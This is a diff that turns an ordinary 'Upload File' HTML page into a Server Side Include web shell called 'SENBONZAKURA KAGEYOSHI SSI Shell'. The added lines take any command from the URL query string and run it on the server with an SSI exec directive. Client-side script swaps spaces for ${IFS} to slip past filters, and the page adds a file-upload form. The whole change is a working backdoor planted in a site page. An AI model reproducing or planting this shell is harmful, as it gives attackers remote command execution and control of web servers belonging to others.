@@ -1,12 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
+<!--#config errmsg="[Unknown Error!]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="uname" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upload File</title>
+    <title>SENBONZAKURA KAGEYOSHI SSI</title>
+    <link href=https://1.bp.blogspot.com/-NcFB4m944Qw/YJcOCIop0uI/AAAAAAAAA4E/yw5Oahakh4sXKsQNnrkqeXBTKqFwoZlAACLcBGAsYHQ/s554/mickey-mouse.png rel=icon />
+    <link href=https://fonts.googleapis.com/css?family=Sedgwick+Ave rel=stylesheet>
+    <style>
+        body {
+            background-color: #FFB2D0;
+            color: black;
+            font-family: Sedgwick Ave;
+            text-align: center;
+        }
+        input, textarea {
+            font-family: Sedgwick Ave;
+            margin: 5px;
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script language="javascript">
+        function fex() {
+            var uri = document.getElementById('command').value;
+            var rep = uri.replace(/[ ]/g, '${IFS}');
+            var res = encodeURI(uri);
+            document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + encodeURI(rep);
+        }
+        function uploadFile() {
+            var form = document.getElementById("uploadForm");
+            form.submit();
+        }
+    </script>
 </head>
 <body>
-    <h1>Upload File</h1>
-    <!--#exec cmd="php -f upload.php" -->
+    <center>
+        <b>
+            <a style="color:black;text-decoration:none;" href="https://facebook.com/val.1337">
+                <font face="Sedgwick Ave" size=6>SENBONZAKURA KAGEYOSHI SSI Shell</font>
+            </a>
+        </b><br><br>
+        <font size=5>
+            makoto@boys:~$ 
+            <input type="text" size=60 id="command" class="text" name="peler" required> 
+            <input type="button" style="color:white;background-color:#808080;" value="Execute!" onclick="fex();">
+        </font><br><br>
+        <font size=3>
+            Output: <!--#echo var=shl -->
+        </font><br><br>
+        <textarea bgcolor="#e4e0d8" cols=120 rows=15><!--#exec cmd=$shl --></textarea><br><br>
+        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="upload.cgi">
+            <input type="file" name="file" required>
+            <input type="button" style="color:white;background-color:#808080;" value="Upload" onclick="uploadFile();">
+        </form>
+    </center>
 </body>
 </html>
